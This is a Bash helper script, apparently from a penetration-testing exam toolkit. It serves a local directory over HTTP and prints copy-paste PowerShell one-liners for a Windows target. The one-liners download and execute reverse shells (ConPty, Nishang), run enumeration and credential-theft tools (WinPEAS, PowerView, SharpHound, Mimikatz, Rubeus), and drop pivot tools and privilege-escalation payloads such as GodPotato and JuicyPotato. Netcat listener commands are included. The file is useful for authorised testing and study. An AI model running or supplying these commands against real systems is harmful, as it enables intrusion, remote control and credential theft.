#!/usr/bin/env bash

# Function to print a simple divider
print_divider() {
    local divider_character="$1"
    local screen_width
    screen_width=$(tput cols)
    local divider_line=""
    for ((i = 0; i < screen_width; i++)); do
        divider_line+="$divider_character"
    done
    echo "$divider_line"
}

# Exit on any error
set -e

# Default port for the Python web server
default_port=8000

# Ask user for port number
read -p "$(tput setaf 4)Enter port number for Python web server (default is $default_port):$(tput sgr0) " port_number

# Use default port if no input is provided
port="${port_number:-$default_port}"

# Default directory to list (can be overridden by the first argument)
#directory="${1:-.}"
directory="${1:-/home/$USER/oscp_res/privEsc/windows}"

# Print a simple divider
print_divider -

# Feedback - location
echo "$(tput setaf 4)Directory: $(tput sgr0)$directory"

# Print a simple divider
print_divider -

# Function to list files
list_files() {
    # Using ls without colors
    ls -p "$directory" | while read -r line; do
        echo "$line"
    done | column
}

# Using custom function for listing files
echo "$(tput setaf 2)Directory listing:$(tput sgr0)"
list_files

# Print a simple divider
print_divider =





# Ask user to choose a network interface
echo "$(tput setaf 2)Choose a network interface:$(tput sgr0)"
interfaces=$(ip -o -4 addr show | awk '{print $2, $4}' | cut -d/ -f1)
select interface in $interfaces; do
    if [ -n "$interface" ]; then
        # Get the IP address of the chosen interface
        chosen_ip=$(echo "$interface" | cut -d' ' -f2)

        # Print a simple divider
        print_divider -

        # Displaying the URLs of the running Python web server for the chosen interface
        echo "$(tput setaf 2)Python Web Server URLs for $chosen_ip:$(tput sgr0)"
        echo "http://$chosen_ip:$port"

        # Print a simple divider
        print_divider =





        # Print the PowerShell command to download and execute the rev shell script for the chosen interface
        echo "$(tput setaf 2)[*]Powershell web request commands to copy/paste $(tput sgr0)"
        echo ""
        echo "$(tput setaf 1)  1.ConTTY Reverse Shell to kali [stty raw -echo; (stty size; cat) | nc -lvnp 443] [$chosen_ip:443] $(tput sgr0)"
        echo "$(tput setaf 3)  IEX(New-Object System.Net.WebClient).DownloadString('http://$chosen_ip:$port/contty_revshell.ps1'); Invoke-ConPtyShell $chosen_ip 443 $(tput sgr0)"
        echo "$(tput setaf 3)  powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://$chosen_ip:$port/contty_revshell.ps1'); Invoke-ConPtyShell $chosen_ip 443 $(tput sgr0)"
        echo "$(tput setaf 1)  ConTTY Background [stty raw -echo; (stty size; cat) | nc -lvnp 442] [$chosen_ip:442] $(tput sgr0)"
        echo "$(tput setaf 3)  Start-Job -ScriptBlock{IEX(New-Object System.Net.WebClient).DownloadString('http://$chosen_ip:$port/contty_revshell.ps1'); Invoke-ConPtyShell $chosen_ip 442} $(tput sgr0)"
        
        echo ""
        echo "$(tput setaf 1)  2.Nishang Rev Shell  $(tput sgr0)"
        echo "$(tput setaf 3)  IEX(New-Object System.Net.WebClient).DownloadString('http://$chosen_ip:$port/Invoke-PowerShellTcp.ps1') $(tput sgr0)"
        echo "$(tput setaf 3)  powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://$chosen_ip:$port/Invoke-PowerShellTcp.ps1') $(tput sgr0)"


        echo ""
        echo "$(tput setaf 1)  3.Enum: WinPEAS  $(tput sgr0)"
        echo "$(tput setaf 3)  IEX(New-Object System.Net.WebClient).DownloadString('http://$chosen_ip:$port/enum/winPEAS.ps1') $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/enum/winPEASany.exe','C:\Users\Public\Downloads\winPEASany.exe') $(tput sgr0)"

        echo ""
        echo "$(tput setaf 1)  4.AD Enum  $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/enum/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1') $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/enum/SharpHound.exe','C:\Users\Public\Downloads\SharpHound.exe') $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/enum/Rubeus.exe','C:\Users\Public\Downloads\Rubeus.exe') $(tput sgr0)"
        echo "$(tput setaf 3)  IEX(IWR -Uri 'http://$chosen_ip:$port/enum/PowerView.ps1' -UseBasicParsing) $(tput sgr0)"
        echo "$(tput setaf 3)  IEX(New-Object System.Net.WebClient).DownloadString('http://$chosen_ip:$port/enum/SharpHound.ps1') $(tput sgr0)"s
        echo "$(tput setaf 3)  IEX(New-Object System.Net.WebClient).DownloadString('http://$chosen_ip:$port/enum/adPEAS.ps1') $(tput sgr0)"

        echo ""
        echo "$(tput setaf 1)  4.Mimikatz  $(tput sgr0)"
        echo "$(tput setaf 3)  IEX(New-Object System.Net.WebClient).DownloadString('http://$chosen_ip:$port/mimikatz/Invoke-Mimikatz.ps1') $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/mimikatz/mimikatz.exe','C:\Users\Public\Downloads\mimikatz.exe') $(tput sgr0)"

        echo ""
        echo "$(tput setaf 1)  4.SysInternals  $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/sysInternals/accesschk.exe','C:\Users\Public\Downloads\accesschk.exe') $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/sysInternals/accesschk64.exe','C:\Users\Public\Downloads\accesschk64.exe') $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/sysInternals/PsExec.exe','C:\Users\Public\Downloads\PsExec.exe') $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/sysInternals/PsExec64.exe','C:\Users\Public\Downloads\PsExec64.exe') $(tput sgr0)"

        echo ""
        echo "$(tput setaf 1)  5. Pivot  $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/Pivot/chisel.exe','C:\Users\Public\Downloads\chisel.exe') $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/Pivot/ligolo/ligolo-agent.exe','C:\Users\Public\Downloads\ligolo-agent.exe') $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/plink.exe','C:\Users\Public\Downloads\plink.exe') $(tput sgr0)"
        
        echo ""
        echo "$(tput setaf 1)  6. PrivEsc Payloads  $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/payloads/adduser/adduser_rootshell_x64.exe','C:\Users\Public\Downloads\adduser_rootshell.exe') $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/payloads/adduser/adduser_rootshell_x86.exe','C:\Users\Public\Downloads\adduser_rootshell.exe') $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/exploits/PrintSpoofer64.exe','C:\Users\Public\Downloads\PrintSpoofer64.exe') $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/potato/GodPotato.exe','C:\Users\Public\Downloads\GodPotato.exe') $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/runasCs.exe','C:\Users\Public\Downloads\runasCs.exe') $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/nc64.exe','C:\Users\Public\Downloads\nc64.exe') $(tput sgr0)"
        echo "$(tput setaf 3)  (New-Object System.Net.WebClient).DownloadFile('http://$chosen_ip:$port/potato/JuicyPotato.exe','C:\Users\Public\Downloads\JuicyPotato.exe') $(tput sgr0)"


    else
        echo "$(tput setaf 1)Invalid choice. Please select a valid network interface.$(tput sgr0)"
    fi
    break
done

print_divider =



# Function to check if contty_revshell.ps1 is present in the current directory
check_revshell() {
  echo "$(tput setaf 2)[*]Checking if contty_revshell.ps1 is present or not $(tput sgr0)"
    if [ -e "contty_revshell.ps1" ]; then
        echo -e "  $(tput setaf 3)contty_revshell.ps1 $(tput sgr0) $(tput setaf 2)\u2713 found. $(tput sgr0)"
    else
        echo -e "$(tput setaf 1)contty_revshell.ps1 not found. $(tput sgr0)"
    fi

    if [ -e "Invoke-PowerShellTcp.ps1" ]; then
        echo -e "  $(tput setaf 3)Invoke-PowerShellTcp.ps1 $(tput sgr0) $(tput setaf 2)\u2713 found. $(tput sgr0)"
    else
        echo -e "$(tput setaf 1)Invoke-PowerShellTcp.ps1 not found. $(tput sgr0)"
    fi
}
check_revshell

# Print a simple divider
print_divider =
 
# Start the HTTP server
echo "$(tput setaf 2)Starting HTTP server on port $port...$(tput sgr0)"
#python3 -m http.server "$port" --directory "$directory"
python3 -m http.server "$port"
